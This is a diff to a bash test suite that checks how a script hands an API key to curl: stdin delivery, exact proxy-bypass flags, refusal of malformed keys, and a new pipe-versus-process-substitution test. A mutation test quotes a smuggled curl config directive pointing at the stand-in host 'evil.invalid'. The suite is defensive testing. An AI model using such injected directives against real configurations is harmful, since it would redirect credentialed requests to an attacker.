@@ -537,6 +537,11 @@ t9_api_key_travels_on_stdin_not_argv() {
   first_arg=$(head -n 1 <<<"$argv")
   assert_eq "T9 --disable is the FIRST curl argument (it aborts ~/.curlrc parsing)" "--disable" "$first_arg"
   assert_contains "T9 --noproxy is present" "--noproxy" "$argv"
+  # The EXACT transport flags, in order: a value mutant (`--noproxy example.invalid`) keeps the word
+  # `--noproxy` and re-enables ALL_PROXY/HTTPS_PROXY for the credentialed request.
+  assert_eq "T9 --noproxy is the SECOND curl argument" "--noproxy" "$(sed -n 2p <<<"$argv")"
+  assert_eq "T9 --noproxy's value is exactly '*' (every host bypasses any proxy)" "*" "$(sed -n 3p <<<"$argv")"
+  assert_eq "T9 the silent-but-show-errors flags follow as -sS" "-sS" "$(sed -n 4p <<<"$argv")"
   assert_contains "T9 the credential config is read from stdin" "--config" "$argv"
   assert_eq "T9 no x-api-key header is an argument" "absent" "$(cp_has "$argv" "x-api-key")"
   assert_eq "T9 the key bytes are in no argument" "absent" "$(cp_has "$argv" "$canary")"
@@ -545,7 +550,6 @@ t9_api_key_travels_on_stdin_not_argv() {
   # The non-secret headers and the body stay arguments, and the payload capture still works.
   assert_contains "T9 anthropic-version stays an argument" "anthropic-version: 2023-06-01" "$argv"
   assert_contains "T9 the request payload is still captured from -d" "messages" "$(cat "$root/curl-capture.txt" 2>/dev/null)"
-  rm -rf "$root"
 }
 
 # --- T10: a key outside the shape class is refused BEFORE any call --------------
@@ -580,7 +584,6 @@ t10_malformed_key_is_refused_before_any_call() {
       assert_eq "T10 [$i] the key is not echoed" "absent" "$(cp_has "$out" "$first_line")"
     fi
     n_ran=$((n_ran + 1))
-    rm -rf "$root"
   done
   # A row floor cannot see a loop that runs zero times; this counter can.
   assert_eq "T10 inner counter: every hostile key ran" "${#keys[@]}" "$n_ran"
@@ -597,7 +600,6 @@ t10_malformed_key_is_refused_before_any_call() {
   assert_contains "T10 empty key: keeps the not-set error" "ANTHROPIC_API_KEY not set" "$out"
   assert_eq "T10 empty key: the mock curl was never called" "false" \
             "$([[ -e "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
-  rm -rf "$root"
 
   # MUST-PASS, not the canonical: a realistic key shape (underscores, dots, tildes, plus, slash,
   # equals) goes through. A guard that refused everything would satisfy every row above.
@@ -611,7 +613,6 @@ t10_malformed_key_is_refused_before_any_call() {
   assert_eq "T10 must-pass: a realistic key shape is accepted (exit 0)" "0" "$exit_code"
   assert_eq "T10 must-pass: it is delivered on stdin intact" "header = \"x-api-key: $real_shape\"" \
             "$(cat "$root/curl-capture.txt.stdin" 2>/dev/null)"
-  rm -rf "$root"
 }
 
 # --- T11: mutation. Remove the guard call -> the same hostile key reaches curl -----
@@ -629,7 +630,7 @@ t11_guard_removal_is_caught() {
   if [[ "$n_calls_real" != "1" || "$n_calls_mut" != "0" ]]; then
     TOTAL=$((TOTAL + 1)); FAIL=$((FAIL + 1))
     echo "FAIL: T11 mutation did not land (real calls=$n_calls_real mutant calls=$n_calls_mut) -- the row would be vacuous"
-    rm -rf "$root"; return
+    return
   fi
   local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
   local curl_bin="$root/curl"; make_mock_curl "$curl_bin" "$root/curl-capture.txt"
@@ -640,7 +641,39 @@ t11_guard_removal_is_caught() {
             "$([[ -e "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
   assert_contains "T11 and the injected directive is on the stdin config" 'url = "http://evil.invalid"' \
             "$(cat "$root/curl-capture.txt.stdin" 2>/dev/null)"
-  rm -rf "$root"
+}
+
+# --- T12: the stdin config is fed by a process substitution, NEVER `printf | curl` ---------
+# Under `set -o pipefail` a curl that exits without reading its stdin can make the printf producer
+# die on SIGPIPE, and the pipeline then reports 141 and `set -e` ends the run. The mock below never
+# reads stdin and the key is longer than a pipe buffer (so the producer is still writing when the
+# consumer is gone): the process-substitution form shrugs that off (exit 0, clusters emitted); the
+# pipe form exits 141. T9 cannot see this: its mock reads stdin to the end.
+make_mock_curl_noread() { # <path> <capture>: records argv, never reads stdin, answers an empty clusters array
+  local path="$1" capture="$2"
+  cat > "$path" <<EOF
+#!/usr/bin/env bash
+printf '%s\0' "\$@" > "$capture.argv"
+printf '%s' '{"content":[{"type":"text","text":"[]"}]}'
+EOF
+  chmod +x "$path"
+}
+
+t12_stdin_config_is_not_a_pipe_into_curl() {
+  local root; root=$(make_enabled_root)
+  local gh_bin="$root/gh"; make_mock_gh "$gh_bin"
+  local curl_bin="$root/curl"; make_mock_curl_noread "$curl_bin" "$root/curl-capture.txt"
+  # 120000 token-class bytes: above the 64 KiB default pipe buffer, below the 128 KiB single-env-string cap.
+  local bigkey; bigkey=$(head -c 120000 /dev/zero | tr '\0' 'A')
+  assert_eq "T12 precondition: the key outgrows a pipe buffer (65536 bytes), else the producer never blocks" \
+            "1" "$(( ${#bigkey} > 65536 ))"
+  local out exit_code=0
+  out=$(COMPOUND_PROMOTE_FIXTURE_ROOT="$root" GH_BIN="$gh_bin" CURL_BIN="$curl_bin" \
+        ANTHROPIC_API_KEY="$bigkey" bash "$SUT" 2>&1) || exit_code=$?
+  assert_eq "T12 a curl that never reads its stdin does not fail the run (a pipe form exits 141)" "0" "$exit_code"
+  assert_eq "T12 the never-reading mock curl WAS called" "true" \
+            "$([[ -e "$root/curl-capture.txt.argv" ]] && echo true || echo false)"
+  assert_contains "T12 the run reached the clusters sentinel" "::compound-promote-clusters-json::" "$out"
 }
 
 t1_no_config_returns_noop
@@ -654,6 +687,7 @@ t8_shell_jq_readers_are_identical_and_type_selecting
 t9_api_key_travels_on_stdin_not_argv
 t10_malformed_key_is_refused_before_any_call
 t11_guard_removal_is_caught
+t12_stdin_config_is_not_a_pipe_into_curl
 
 echo
 echo "PASS=$PASS FAIL=$FAIL TOTAL=$TOTAL"
@@ -667,7 +701,7 @@ echo "PASS=$PASS FAIL=$FAIL TOTAL=$TOTAL"
 # by slicing the floor block plus the CONTIGUOUS simple assignments above it, so a
 # threshold declared further up leaves the mutant unbound under `set -u` and the floor
 # scores as a construction failure instead of as a firing floor.
-MIN_ASSERTIONS=92
+MIN_ASSERTIONS=99
 if [[ "$TOTAL" -lt "$MIN_ASSERTIONS" ]]; then
   printf 'FATAL: assertion floor breached (TOTAL=%s < %s) — cases did not dispatch\n' \
     "$TOTAL" "$MIN_ASSERTIONS" >&2
